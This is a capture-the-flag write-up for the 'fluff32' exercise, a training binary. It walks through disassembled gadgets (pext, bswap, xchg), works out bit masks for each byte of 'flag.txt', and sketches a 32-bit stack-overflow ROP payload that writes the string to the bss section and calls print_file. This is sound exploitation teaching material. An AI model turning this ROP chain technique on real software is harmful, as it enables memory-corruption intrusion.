# fluff32
Almost same as problem write4, there is a function print_file in libfluff.so, we only need set the filename such as "flag.txt" into argument, nad call the function. But the only difference is that there is no suitable gadget in fluff binary. One way is to use the gadget in libfluff.so, and another way according to the hint is to use gadget in function questionableGadgets.

Check the binary security:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
PIE is disabled, then write data into data section is possible.

Check the function questionableGadgets:
```
0x08048543 <+0>:	mov    eax,ebp
0x08048545 <+2>:	mov    ebx,0xb0bababa
0x0804854a <+7>:	pext   edx,ebx,eax
0x0804854f <+12>:	mov    eax,0xdeadbeef
0x08048554 <+17>:	ret    
0x08048555 <+18>:	xchg   BYTE PTR [ecx],dl
0x08048557 <+20>:	ret    
0x08048558 <+21>:	pop    ecx
0x08048559 <+22>:	bswap  ecx
0x0804855b <+24>:	ret    
0x0804855c <+25>:	xchg   ax,ax
0x0804855e <+27>:	xchg   ax,ax
```
There are three gadgets in the function. Read the instructions individually. The instructions pext, xchg and bswap can be combined to write data into memory location.
```
...
mov    eax,ebp
mov    ebx,0xb0bababa
pext   edx,ebx,eax
mov    eax,0xdeadbeef
ret 
# pext will use eax as a mask to copy ebx value to edx. Each bit in eax if is 1, will copy the ebx value align to low bit, if bit is 0, will ignore the value, the rest bit will be set to 0. We can control eax through pop ebp, and using pext instruction, we can set value we want into edx(dl) register.
...
```
```
...
0x08048558 <+21>:	pop    ecx
0x08048559 <+22>:	bswap  ecx
0x0804855b <+24>:	ret  
# bswap can swap bits order in ecx. In this gadget, we can control ecx value.
...
```
```
...
0x08048555 <+18>:	xchg   BYTE PTR [ecx],dl
0x08048557 <+20>:	ret 
# xchg will exchange value between [ecx] and dl, which means we write the value we want into certain memory location. Since we can control ecx through previous gadget.
...
```
Using these three gadgets, we can first control ebp value, and ebp value will be set to eax, through pext, we set each byte in "flag.txt" into edx(dl), and control ecx to address in data section, finally, use xchg to exchange the dl value into data section.

We also find some useful gadgets in binary:
```
...
0x080485bb: pop ebp; ret; (gadget1) # control ebp
...
```
Since xchg instruction can only store one byte to memory, we need to move byte "flag.txt" inividually, and since ebx is fixed, we can only control eax, each pext instruction should ouput each byte in "flag.txt", then we can evaluate eax value, according to the pext instruction detail.

```
# ebx = 0xb0bababa
#                                             
#                          1011 1010 1011 1010 # baba
#                          
#                          0100 1011 0100 1011 # f_mask(0x4b4b)
#                                    0110 0110 # f(0x66)
#
#                               0100 1101 1101 # l_mask(0x6dd)
#                                    0110 1100 # l(0x6c)
#
#                          0101 1101 0100 0110 # a_mask(0x5d46)  
#                                    0110 0001 # a(0x61)
#
#                          0100 1011 0101 1010 # g_mask(0x4b5a)   
#                                    0110 0111 # g(0x67)
#
#                               0101 1101 1011 # ._mask(0x5db)
#                                    0010 1110 # .(0x2e)
#
#                          0100 1010 1100 1101 # t_mask(0x4acd)
#                                    0111 0100 # t(0x74)
#
#                          0101 1010 1100 0101 # x_mask(0x5ac5)
#                                    0111 1000 # x(0x78)
```
Each mask will be:
```
f_mask = 0x04b4b
l_mask = 0x06dd
a_mask = 0x05d46
g_mask = 0x04b5a
dot_mask = 0x05db
t_mask = 0x04acd
x_mask = 0x05ac5
```
We can build payload:
```
payload = 'A'*44
payload += p32(bswap) + p32(bss, endian='big') 
# pop ecx, since ecx will be swaped, we use big endian directly.
payload += p32(gadget1) + p32(f_mask) + p32(pext) + p32(xchg)
# pop mask into ebp, and do pext and xchg
```
Same pattern for every byte in "flag.txt".

Finally, jump to print_file and set argument. Since the stack structure will be ebp, ret, parameter1... We need to add offset for ret space.
```
payload += p32(print_file) + 'A'*4 + p32(bss)
# jump to print_file, and push "flag.txt" address bss into stack. 
```
Run the exploit.py, obtain the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
